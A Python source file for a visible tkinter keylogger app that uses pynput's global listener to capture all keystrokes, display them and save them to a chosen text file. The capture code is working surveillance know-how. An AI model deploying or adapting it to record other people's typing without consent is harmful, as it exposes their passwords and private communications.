import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
from pynput import keyboard
from datetime import datetime

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Simple Keylogger")
        self.root.geometry("600x400")
        self.root.resizable(False, False)

        self.is_logging = False
        self.log = ""
        self.listener = None
        self.log_file = None

        self.create_widgets()

    def create_widgets(self):
        # Frame for buttons
        btn_frame = tk.Frame(self.root)
        btn_frame.pack(pady=10)

        self.start_btn = tk.Button(btn_frame, text="Start Logging", width=15, command=self.start_logging)
        self.start_btn.grid(row=0, column=0, padx=10)
        self.start_btn.bind("<Enter>", self.on_hover)
        self.start_btn.bind("<Leave>", self.on_leave)

        self.stop_btn = tk.Button(btn_frame, text="Stop Logging", width=15, state='disabled', command=self.stop_logging)
        self.stop_btn.grid(row=0, column=1, padx=10)
        self.stop_btn.bind("<Enter>", self.on_hover)
        self.stop_btn.bind("<Leave>", self.on_leave)

        self.save_btn = tk.Button(btn_frame, text="Save Log", width=15, state='disabled', command=self.save_log)
        self.save_btn.grid(row=0, column=2, padx=10)
        self.save_btn.bind("<Enter>", self.on_hover)
        self.save_btn.bind("<Leave>", self.on_leave)

        self.clear_btn = tk.Button(btn_frame, text="Clear Log", width=15, state='disabled', command=self.clear_log)
        self.clear_btn.grid(row=0, column=3, padx=10)
        self.clear_btn.bind("<Enter>", self.on_hover)
        self.clear_btn.bind("<Leave>", self.on_leave)

        # Scrolled text for showing captured keys
        self.text_area = scrolledtext.ScrolledText(self.root, width=70, height=20, font=("Consolas", 12))
        self.text_area.pack(padx=10, pady=10)
        self.text_area.config(state='disabled')

        # Status label
        self.status_label = tk.Label(self.root, text="Status: Not Logging", font=("Arial", 12))
        self.status_label.pack(pady=5)

        # Keyboard shortcuts
        self.root.bind('<Control-l>', lambda event: self.start_logging())
        self.root.bind('<Control-s>', lambda event: self.stop_logging())

    def on_press(self, key):
        try:
            self.log += f"{key.char}"
            self.update_text(f"{key.char}")
        except AttributeError:
            # Special keys (space, enter, etc)
            if key == keyboard.Key.space:
                self.log += " "
                self.update_text(" ")
            elif key == keyboard.Key.enter:
                self.log += "\n"
                self.update_text("\n")
            elif key == keyboard.Key.tab:
                self.log += "\t"
                self.update_text("\t")
            else:
                self.log += f" [{key.name}] "
                self.update_text(f" [{key.name}] ")

    def update_text(self, char):
        self.text_area.config(state='normal')
        self.text_area.insert(tk.END, char)
        self.text_area.see(tk.END)
        self.text_area.config(state='disabled')

    def start_logging(self):
        if not self.is_logging:
            # Prompt to choose log file
            self.log_file = filedialog.asksaveasfilename(defaultextension=".txt",
                                                         filetypes=[("Text files", "*.txt")],
                                                         title="Select Log File")
            if not self.log_file:
                return

            self.is_logging = True
            self.log = ""
            self.text_area.config(state='normal')
            self.text_area.delete(1.0, tk.END)
            self.text_area.config(state='disabled')

            self.start_btn.config(state='disabled')
            self.stop_btn.config(state='normal')
            self.save_btn.config(state='disabled')
            self.clear_btn.config(state='normal')

            # Start listener in a separate thread to avoid blocking the UI
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.update_text(f"[Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            self.status_label.config(text="Status: Logging...")

    def stop_logging(self):
        if self.is_logging:
            self.listener.stop()
            self.is_logging = False
            self.start_btn.config(state='normal')
            self.stop_btn.config(state='disabled')
            self.save_btn.config(state='normal')
            self.clear_btn.config(state='normal')
            self.update_text(f"\n[Logging stopped at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            self.status_label.config(text="Status: Not Logging")

    def save_log(self):
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as file:
                    file.write(self.log)
                messagebox.showinfo("Success", f"Log saved successfully to:\n{self.log_file}")
                self.save_btn.config(state='disabled')
            except Exception as e:
                messagebox.showerror("Error", f"Could not save log:\n{e}")

    def clear_log(self):
        self.log = ""
        self.text_area.config(state='normal')
        self.text_area.delete(1.0, tk.END)
        self.text_area.config(state='disabled')
        self.status_label.config(text="Status: Log Cleared")

    def on_hover(self, event):
        event.widget.configure(bg="#43a047")

    def on_leave(self, event):
        event.widget.configure(bg="#4caf50")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
